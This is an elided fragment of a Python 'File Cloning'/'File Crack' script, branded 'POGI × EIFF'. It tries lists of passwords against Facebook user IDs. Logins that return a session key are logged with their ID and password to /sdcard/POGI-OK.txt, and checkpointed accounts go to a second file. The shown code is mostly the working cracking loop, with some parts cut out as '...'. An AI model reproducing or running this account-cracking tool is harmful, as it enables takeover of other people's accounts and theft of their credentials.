...
""")                                                                                                                      
    print(50*'-')
    print(f" {white}{green}[~]{white} Owner     : POGI × EIFF ")
    print(f" {white}{green}[~]{white} Facebook  : EIFF HUCZN ")
    print(f" {white}{green}[~]{white} Tool      : File Cloning ")
...
def infinty():
    ...
    print(50*"-")
    print(f'{white}{green} [1]{white} File Crack')
...
def bapif(uidY,pwx,total):
    ...
    try:
        ...
        last = "Khan"
    try:
        sys.stdout.write(f'\r\r[{green}POGI-CRACKING{white}]  {len(cracked)} : {total}  -  {green}{len(oks)}{white} : {rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uid not in oks:
                    print(f'\r\n\n{white}[{green}×{white}] STATUS : {green}ALIVE/OK\n{white}[{green}×{white}] E & P : {white}[e.] {green}{uid} {white}[p.] {green}{pw}\n{white}[{green}×{white}] CREATION DATE :{green}{asha(uid)}\n{white}[{green}×{white}] FB LINK :{yellow} https://facebook.com/{uid}\n{white}[{green}×{white}] COOKIE: {yellow}?{white}\n')
                    open('/sdcard/POGI-OK.txt', 'a').write(uid+'|'+pw+'\n')
                    oks.append(uid)
            elif responce_json['error']['code'] == 405:
                #uid = responce_json['error']['uid']
                if uid not in cps:
                    print(f'\r\n{rad}[POGI-CP] {uid} | {pw} {white}\n')
                    open('/sdcard/POGI-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uidX)
            else:continue
        cracked.append(uid)
